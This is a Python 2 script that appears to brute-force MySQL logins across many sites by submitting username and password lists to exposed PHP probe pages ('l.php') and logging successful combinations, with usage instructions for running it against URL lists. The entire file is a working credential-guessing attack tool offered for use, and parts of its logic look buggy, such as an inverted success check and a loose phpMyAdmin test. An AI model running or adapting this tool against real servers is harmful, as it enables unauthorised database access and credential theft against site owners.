# coding:utf-8
import sys, urllib2,gzip,StringIO,re,sys,os,time
import requests
os_char='gb18030'



def havePhpMyadmin(url):
    res = requests.get(url)
    if res.status_code == 200:
        if res.text.encode("utf-8").find("phpMyAdmin"):
            return True
    return False
def L0gin(url,u,p,o=None,auto_append=False):
    '''
        auto_append will auto append 'l.php' after url.
    '''
    # global errors,now
    try:
        if (url[:5] != "l.php" and auto_append):
            if url[:-1] != '/':
                url+='l.php'
            else:
                url+='/l.php'

        params = "host=localhost&port=3306&login="+u+"&password="+p+"&act=MySQL%E6%A3%80%E6%B5%8B&funName="
        '''params = {
            "host":"localhost",
            "port":"3306",
            "login":u,
            "password":p,
            "act":"MySQL%E6%A3%80%E6%B5%8B",
            "funName":"",
        }'''
        headers = {
            "Accept": "image/gif, */*",
            "Accept-Language": "zh-cn",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip, deflate",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36",
            "Connection": "Keep-Alive",
            "Cache-Control": "no-cache"
        }

        s = requests.post(url,params,headers=headers).text
        reli = re.findall(u'<script>alert(.*?)</script>',s)
        
        print("[DEBUG]"+url+'----',reli[0].encode("gbk"),reli[0].find("失败"))
        phpMyAdmin = "have"
        if len(reli) != 0:
            if reli[0].find("失败") != -1:
                print("[Success]--"+url+"--u:"+u+"--p:"+p+"-----"+phpMyAdmin)
                if o:
                    o.write("%s---%s---%s----%s"%(url,u,p,phpMyAdmin))
                    return True

    except Exception as e:
        print(e)


if __name__ == '__main__':

    if len(sys.argv) <= 2:
        print(sys.argv)
        print("Usage:\n\t pip install requests\n\t python <filename>.py <urlList/url> <userDict_path/username> <passwdDic/password> <log=Log.txt>")
        sys.exit()
    uListMode = False
    pListMode = False
    UrlListMode = False
    Url = sys.argv[1]
    u = sys.argv[2]
    p = sys.argv[3]
    Log= "log.txt" if sys.argv[4] == "" else sys.argv[4]
    log_fp = open(Log,"a+")
    log_fp.write("\n\n\n")
    if os.path.isfile(Url):
        UrlListMode = True
    if os.path.isfile(u):
        uListMode = True
    if os.path.isfile(p):
        pListMode = True
    if UrlListMode:
        ufp =open(Url, "r")
        urllines=ufp.readlines()
        ufp.close()
    else:
        urllines = []
        urllines.append(Url)
    if pListMode:
        pfp = open(p,"r")
        passlines = pfp.readlines()
        pfp.close()
    else:
        passlines = []
        passlines.append(p)
    if uListMode:
        ufp = open(u,"r")
        usrlines=ufp.readlines()
        ufp.close()
    else:
        usrlines = []
        usrlines.append(u)
    isbreak = 0
    for eachline in urllines:
            eachline=eachline.strip('\n')
            for usr in usrlines:
                usr = usr.strip('\n')
                if isbreak ==1:
                    isbreak = 0
                    break
                for pwd in passlines:
                    pwd = pwd.strip('\n')
                    print(eachline,usr,pwd)
                    if L0gin(eachline,usr,pwd,log_fp,True):
                        isbreak = 1
                        break
